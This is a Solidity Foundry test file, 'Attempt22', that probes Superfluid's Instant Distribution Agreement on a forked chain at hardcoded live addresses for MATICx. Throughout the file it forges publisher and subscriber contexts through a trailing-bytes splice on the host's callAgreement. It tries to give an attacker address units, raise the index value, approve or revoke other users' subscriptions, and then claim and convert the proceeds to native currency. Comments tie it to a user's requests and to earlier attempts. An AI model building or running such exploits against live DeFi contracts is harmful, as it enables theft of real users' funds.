// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";
import {ContextUtils} from "reference/ContextUtils.sol";

interface ISuperAgreement {}

interface ISuperfluidHost {
    function callAgreement(
        ISuperAgreement agreementClass,
        bytes calldata callData,
        bytes calldata userData
    ) external returns (bytes memory returnedData);

    function getAppManifest(address app) external view returns (bool isSuperApp, bool isJailed, uint256 noopMask);
}

interface IMATICxLike {
    function balanceOf(address account) external view returns (uint256);

    function downgradeToETH(uint256 wad) external;
}

interface IInstantDistributionAgreementV1 is ISuperAgreement {
    function updateIndex(
        address token,
        uint32 indexId,
        uint128 indexValue,
        bytes calldata ctx
    ) external returns (bytes memory newCtx);

    function distribute(
        address token,
        uint32 indexId,
        uint256 amount,
        bytes calldata ctx
    ) external returns (bytes memory newCtx);

    function updateSubscription(
        address token,
        uint32 indexId,
        address subscriber,
        uint128 units,
        bytes calldata ctx
    ) external returns (bytes memory newCtx);

    function approveSubscription(
        address token,
        address publisher,
        uint32 indexId,
        bytes calldata ctx
    ) external returns (bytes memory newCtx);

    function revokeSubscription(
        address token,
        address publisher,
        uint32 indexId,
        bytes calldata ctx
    ) external returns (bytes memory newCtx);

    function claim(
        address token,
        address publisher,
        uint32 indexId,
        address subscriber,
        bytes calldata ctx
    ) external returns (bytes memory newCtx);

    function getIndex(address token, address publisher, uint32 indexId)
        external
        view
        returns (bool exist, uint128 indexValue, uint128 totalUnitsApproved, uint128 totalUnitsPending);

    function getSubscription(address token, address publisher, uint32 indexId, address subscriber)
        external
        view
        returns (bool exist, bool approved, uint128 units, uint256 pendingDistribution);
}

/// @title Attempt22
/// @notice Hypothesis: the fork-only unverified IDA implementation might have
///         additional missing `authorizeTokenAccess(...)` coverage on
///         non-`claim()` paths. This probe re-tests the five neighboring IDA
///         mutators the user asked for against a live MATICx publisher index
///         using the working host-trailing-bytes ctx splice:
///         1. `updateSubscription(..., attacker, 1, forgedPublisherCtx)`
///         2. `updateIndex(..., currentIndexValue + 1, forgedPublisherCtx)`
///         3. `distribute(..., totalUnitsApproved + totalUnitsPending, forgedPublisherCtx)`
///         4. `approveSubscription(..., forgedSubscriberCtx)` on a live
///            unapproved subscriber
///         5. `revokeSubscription(..., forgedApprovedSubscriberCtx)` on a live
///            approved subscriber
///
///         If any host-trailing probe succeeds or reverts with something other
///         than `invalid ctx`, that points to a new non-claim vector. The
///         primary scenario chains `updateSubscription -> updateIndex -> claim`
///         to see whether a forged publisher can mint attacker pending
///         distribution on a real historical publisher index.
/// @dev The live fork surface only exposes the public 4-argument
///      `revokeSubscription(token, publisher, indexId, ctx)` selector. The
///      user prompt's 5-argument shape does not exist on the runtime surface;
///      that extra-`subscriber` signature corresponds to `deleteSubscription`,
///      which earlier attempts already closed.
contract Attempt22 is Test {
    uint256 internal constant FORK_BLOCK = 27_039_967;

    address internal constant ATTACKER = 0xc943eDB4Bb4439d65B81f2f60Bc698411e910B14;
    address internal constant HOST_ADDR = 0x3E14dC1b13c488a8d5D310918780c983bD5982E7;
    address internal constant IDA_ADDR = 0xB0aABBA4B2783A72C52956CDEF62d438ecA2d7a1;
    address internal constant MATICX_ADDR = 0x3aD736904E9e65189c3000c7DD2c8AC8bB7cD4e3;

    address internal constant LIVE_PUBLISHER = 0xcaB28480ab5c1E133e9B7FC67E030B8DCC2A1d24;
    uint32 internal constant LIVE_INDEX_ID = 1;

    address internal constant LIVE_UNAPPROVED_SUBSCRIBER = 0x9C6B5FdC145912dfe6eE13A667aF3C5Eb07CbB89;
    address internal constant LIVE_APPROVED_SUBSCRIBER = 0x1c81F6A5dbD715BE1a66a38F7Ed3Bbcd4098EDd4;

    uint128 internal constant ATTACKER_UNITS = 1;

    ISuperfluidHost internal constant HOST = ISuperfluidHost(HOST_ADDR);
    IInstantDistributionAgreementV1 internal constant IDA = IInstantDistributionAgreementV1(IDA_ADDR);
    IMATICxLike internal constant MATICX = IMATICxLike(MATICX_ADDR);

    function setUp() public {
        vm.createSelectFork("ch5", FORK_BLOCK);

        vm.label(ATTACKER, "Attacker");
        vm.label(HOST_ADDR, "SuperfluidHost");
        vm.label(IDA_ADDR, "IDA");
        vm.label(MATICX_ADDR, "MATICx");
        vm.label(LIVE_PUBLISHER, "LivePublisher");
        vm.label(LIVE_UNAPPROVED_SUBSCRIBER, "LiveUnapprovedSubscriber");
        vm.label(LIVE_APPROVED_SUBSCRIBER, "LiveApprovedSubscriber");
    }

    function test_updateSubscription_plus_updateIndex_chain_scan() public {
        _logPreflight();

        (bool publisherIsApp, bool publisherIsJailed, uint256 noopMask) = HOST.getAppManifest(LIVE_PUBLISHER);
        console.log("[publisher] isSuperApp:", publisherIsApp);
        console.log("[publisher] isJailed:", publisherIsJailed);
        console.log("[publisher] noopMask:", noopMask);

        assertTrue(publisherIsApp, "live publisher should still be a registered app");
        assertFalse(publisherIsJailed, "live publisher should still be non-jailed for this probe");

        (bool indexExists, uint128 indexValueBefore,, uint128 totalUnitsPendingBefore) =
            IDA.getIndex(MATICX_ADDR, LIVE_PUBLISHER, LIVE_INDEX_ID);
        (bool attackerSubExistsBefore, bool attackerApprovedBefore, uint128 attackerUnitsBefore, uint256 attackerPendingBefore)
        = IDA.getSubscription(MATICX_ADDR, LIVE_PUBLISHER, LIVE_INDEX_ID, ATTACKER);

        console.log("[baseline] index exists:", indexExists);
        console.log("[baseline] index value:", uint256(indexValueBefore));
        console.log("[baseline] attacker sub exists:", attackerSubExistsBefore);
        console.log("[baseline] attacker approved:", attackerApprovedBefore);
        console.log("[baseline] attacker units:", uint256(attackerUnitsBefore));
        console.log("[baseline] attacker pending:", attackerPendingBefore);
        console.log("[baseline] total units pending:", uint256(totalUnitsPendingBefore));

        assertTrue(indexExists, "live publisher index should exist");

        bytes memory forgedUpdateSubscriptionCtx = _buildContext(LIVE_PUBLISHER, IDA.updateSubscription.selector);
        bytes memory updateSubscriptionCall = abi.encodeCall(
            IDA.updateSubscription, (MATICX_ADDR, LIVE_INDEX_ID, ATTACKER, ATTACKER_UNITS, forgedUpdateSubscriptionCtx)
        );

        vm.prank(ATTACKER);
        (bool updateSubscriptionOk, bytes memory updateSubscriptionRet) =
            _callAgreementWithTrailingBytes(updateSubscriptionCall);
        _logCallResult("updateSubscription(host trailing forged publisher)", updateSubscriptionOk, updateSubscriptionRet);

        (bool attackerSubExistsAfterUpdate, bool attackerApprovedAfterUpdate, uint128 attackerUnitsAfterUpdate, uint256 attackerPendingAfterUpdate)
        = IDA.getSubscription(MATICX_ADDR, LIVE_PUBLISHER, LIVE_INDEX_ID, ATTACKER);

        console.log("[updateSubscription] attacker sub exists after:", attackerSubExistsAfterUpdate);
        console.log("[updateSubscription] attacker approved after:", attackerApprovedAfterUpdate);
        console.log("[updateSubscription] attacker units after:", uint256(attackerUnitsAfterUpdate));
        console.log("[updateSubscription] attacker pending after:", attackerPendingAfterUpdate);

        bytes memory forgedUpdateIndexCtx = _buildContext(LIVE_PUBLISHER, IDA.updateIndex.selector);
        bytes memory updateIndexCall =
            abi.encodeCall(IDA.updateIndex, (MATICX_ADDR, LIVE_INDEX_ID, indexValueBefore + 1, forgedUpdateIndexCtx));

        vm.prank(ATTACKER);
        (bool updateIndexOk, bytes memory updateIndexRet) = _callAgreementWithTrailingBytes(updateIndexCall);
        _logCallResult("updateIndex(host trailing forged publisher)", updateIndexOk, updateIndexRet);

        (, uint128 indexValueAfter,, uint128 totalUnitsPendingAfter) = IDA.getIndex(MATICX_ADDR, LIVE_PUBLISHER, LIVE_INDEX_ID);
        (bool attackerSubExistsAfterIndex, bool attackerApprovedAfterIndex, uint128 attackerUnitsAfterIndex, uint256 attackerPendingAfterIndex)
        = IDA.getSubscription(MATICX_ADDR, LIVE_PUBLISHER, LIVE_INDEX_ID, ATTACKER);

        console.log("[updateIndex] index value after:", uint256(indexValueAfter));
        console.log("[updateIndex] total units pending after:", uint256(totalUnitsPendingAfter));
        console.log("[updateIndex] attacker sub exists after:", attackerSubExistsAfterIndex);
        console.log("[updateIndex] attacker approved after:", attackerApprovedAfterIndex);
        console.log("[updateIndex] attacker units after:", uint256(attackerUnitsAfterIndex));
        console.log("[updateIndex] attacker pending after:", attackerPendingAfterIndex);

        if (attackerPendingAfterIndex > attackerPendingBefore) {
            _claimAndDowngrade(attackerPendingAfterIndex);
        } else {
            console.log("[follow-up claim] skipped because attacker pending did not increase");
        }
    }

    function test_distribute_host_trailing_scan() public {
        _logPreflight();

        (bool indexExists,, uint128 totalUnitsApproved, uint128 totalUnitsPending) =
            IDA.getIndex(MATICX_ADDR, LIVE_PUBLISHER, LIVE_INDEX_ID);
        uint256 amount = uint256(totalUnitsApproved) + uint256(totalUnitsPending);
        if (amount == 0) amount = 1;

        console.log("[baseline distribute] index exists:", indexExists);
        console.log("[baseline distribute] totalUnitsApproved:", uint256(totalUnitsApproved));
        console.log("[baseline distribute] totalUnitsPending:", uint256(totalUnitsPending));
        console.log("[baseline distribute] amount:", amount);

        assertTrue(indexExists, "live publisher index should exist for distribute probe");

        bytes memory forgedCtx = _buildContext(LIVE_PUBLISHER, IDA.distribute.selector);
        bytes memory inner = abi.encodeCall(IDA.distribute, (MATICX_ADDR, LIVE_INDEX_ID, amount, forgedCtx));

        vm.prank(ATTACKER);
        (bool ok, bytes memory ret) = _callAgreementWithTrailingBytes(inner);
        _logCallResult("distribute(host trailing forged publisher)", ok, ret);
    }

    function test_approveSubscription_host_trailing_scan() public {
        _logPreflight();

        (bool existBefore, bool approvedBefore, uint128 unitsBefore, uint256 pendingBefore) =
            IDA.getSubscription(MATICX_ADDR, LIVE_PUBLISHER, LIVE_INDEX_ID, LIVE_UNAPPROVED_SUBSCRIBER);
        uint256 balanceBefore = MATICX.balanceOf(LIVE_UNAPPROVED_SUBSCRIBER);

        console.log("[baseline approve] exist:", existBefore);
        console.log("[baseline approve] approved:", approvedBefore);
        console.log("[baseline approve] units:", uint256(unitsBefore));
        console.log("[baseline approve] pending:", pendingBefore);
        console.log("[baseline approve] subscriber balance:", balanceBefore);

        assertTrue(existBefore, "target unapproved subscription must exist");
        assertFalse(approvedBefore, "target subscriber must start unapproved");
        assertGt(pendingBefore, 0, "target unapproved subscription should have positive pending distribution");

        bytes memory forgedCtx = _buildContext(LIVE_UNAPPROVED_SUBSCRIBER, IDA.approveSubscription.selector);
        bytes memory inner =
            abi.encodeCall(IDA.approveSubscription, (MATICX_ADDR, LIVE_PUBLISHER, LIVE_INDEX_ID, forgedCtx));

        vm.prank(ATTACKER);
        (bool ok, bytes memory ret) = _callAgreementWithTrailingBytes(inner);
        _logCallResult("approveSubscription(host trailing forged subscriber)", ok, ret);

        (bool existAfter, bool approvedAfter, uint128 unitsAfter, uint256 pendingAfter) =
            IDA.getSubscription(MATICX_ADDR, LIVE_PUBLISHER, LIVE_INDEX_ID, LIVE_UNAPPROVED_SUBSCRIBER);
        uint256 balanceAfter = MATICX.balanceOf(LIVE_UNAPPROVED_SUBSCRIBER);

        console.log("[approve after] exist:", existAfter);
        console.log("[approve after] approved:", approvedAfter);
        console.log("[approve after] units:", uint256(unitsAfter));
        console.log("[approve after] pending:", pendingAfter);
        console.log("[approve after] subscriber balance:", balanceAfter);
    }

    function test_revokeSubscription_host_trailing_scan() public {
        _logPreflight();
        console.log(
            "[revoke note] runtime surface only exposes revokeSubscription(token,publisher,indexId,ctx); no 5-arg revoke selector"
        );

        (bool existBefore, bool approvedBefore, uint128 unitsBefore, uint256 pendingBefore) =
            IDA.getSubscription(MATICX_ADDR, LIVE_PUBLISHER, LIVE_INDEX_ID, LIVE_APPROVED_SUBSCRIBER);

        console.log("[baseline revoke] exist:", existBefore);
        console.log("[baseline revoke] approved:", approvedBefore);
        console.log("[baseline revoke] units:", uint256(unitsBefore));
        console.log("[baseline revoke] pending:", pendingBefore);

        assertTrue(existBefore, "target approved subscription must exist");
        assertTrue(approvedBefore, "target subscriber must start approved");

        bytes memory forgedCtx = _buildContext(LIVE_APPROVED_SUBSCRIBER, IDA.revokeSubscription.selector);
        bytes memory inner =
            abi.encodeCall(IDA.revokeSubscription, (MATICX_ADDR, LIVE_PUBLISHER, LIVE_INDEX_ID, forgedCtx));

        vm.prank(ATTACKER);
        (bool ok, bytes memory ret) = _callAgreementWithTrailingBytes(inner);
        _logCallResult("revokeSubscription(host trailing forged subscriber)", ok, ret);

        (bool existAfter, bool approvedAfter, uint128 unitsAfter, uint256 pendingAfter) =
            IDA.getSubscription(MATICX_ADDR, LIVE_PUBLISHER, LIVE_INDEX_ID, LIVE_APPROVED_SUBSCRIBER);

        console.log("[revoke after] exist:", existAfter);
        console.log("[revoke after] approved:", approvedAfter);
        console.log("[revoke after] units:", uint256(unitsAfter));
        console.log("[revoke after] pending:", pendingAfter);
    }

    function _claimAndDowngrade(uint256 pendingAfterIndex) internal {
        uint256 attackerTokenBefore = MATICX.balanceOf(ATTACKER);
        uint256 attackerNativeBefore = ATTACKER.balance;

        console.log("[follow-up claim] attacker token before:", attackerTokenBefore);
        console.log("[follow-up claim] attacker native before:", attackerNativeBefore);
        console.log("[follow-up claim] attacker pending before claim:", pendingAfterIndex);

        vm.prank(ATTACKER);
        HOST.callAgreement(
            IDA,
            abi.encodeCall(IDA.claim, (MATICX_ADDR, LIVE_PUBLISHER, LIVE_INDEX_ID, ATTACKER, new bytes(0))),
            new bytes(0)
        );

        uint256 attackerTokenAfterClaim = MATICX.balanceOf(ATTACKER);
        console.log("[follow-up claim] attacker token after claim:", attackerTokenAfterClaim);

        if (attackerTokenAfterClaim > attackerTokenBefore) {
            vm.prank(ATTACKER);
            MATICX.downgradeToETH(attackerTokenAfterClaim - attackerTokenBefore);
        }

        uint256 attackerTokenAfterDowngrade = MATICX.balanceOf(ATTACKER);
        uint256 attackerNativeAfter = ATTACKER.balance;

        console.log("[follow-up claim] attacker token after downgrade:", attackerTokenAfterDowngrade);
        console.log("[follow-up claim] attacker native after:", attackerNativeAfter);
        console.log("[follow-up claim] native delta:", attackerNativeAfter - attackerNativeBefore);
    }

    function _buildContext(address forgedMsgSender, bytes4 selector) internal view returns (bytes memory) {
        ContextUtils.Context memory context =
            ContextUtils.buildContext(forgedMsgSender, selector, abi.encodePacked("attempt22:", selector));
        return ContextUtils.encodeContext(context);
    }

    function _callAgreementWithTrailingBytes(bytes memory inner) internal returns (bool ok, bytes memory ret) {
        bytes memory outer = abi.encodePacked(inner, abi.encode(new bytes(0)));
        return address(HOST).call(abi.encodeCall(HOST.callAgreement, (IDA, outer, new bytes(0))));
    }

    function _logPreflight() internal view {
        console.log("[preflight] chain id:", block.chainid);
        console.log("[preflight] fork block:", block.number);
        console.log("[preflight] attacker native:", ATTACKER.balance);
        console.log("[preflight] live publisher MATICx balance:", MATICX.balanceOf(LIVE_PUBLISHER));
    }

    function _logCallResult(string memory label, bool ok, bytes memory wrappedRet) internal pure {
        console.log(label);
        console.log("  ok:", ok);

        if (!ok) {
            console.log("  revert:", _decodeRevert(wrappedRet));
            return;
        }

        bytes memory returnedData = _decodeHostReturn(wrappedRet);
        console.log("  host return bytes:", wrappedRet.length);
        console.log("  agreement return bytes:", returnedData.length);

        if (returnedData.length == 0) {
            return;
        }

        ContextUtils.Context memory decoded = ContextUtils.decodeContext(returnedData);
        console.log("  returned msgSender:", decoded.msgSender);
        console.log("  returned appAddress:", decoded.appAddress);
        console.log("  returned callType:", uint256(decoded.callType));
        console.log("  returned appLevel:", uint256(decoded.appCallbackLevel));
        console.log("  returned selector:");
        console.logBytes32(bytes32(decoded.agreementSelector));
    }

    function _decodeHostReturn(bytes memory wrappedRet) internal pure returns (bytes memory returnedData) {
        if (wrappedRet.length == 0) {
            return new bytes(0);
        }

        returnedData = abi.decode(wrappedRet, (bytes));
    }

    function _decodeRevert(bytes memory revertData) internal pure returns (string memory) {
        if (revertData.length < 4) {
            if (revertData.length == 0) return "silent revert";
            return string(revertData);
        }

        bytes4 selector;
        assembly {
            selector := mload(add(revertData, 32))
        }

        if (selector == 0x08c379a0 && revertData.length >= 68) {
            assembly {
                revertData := add(revertData, 4)
            }
            return abi.decode(revertData, (string));
        }

        if (selector == 0x4e487b71) {
            return "panic";
        }

        return "custom/unknown";
    }
}
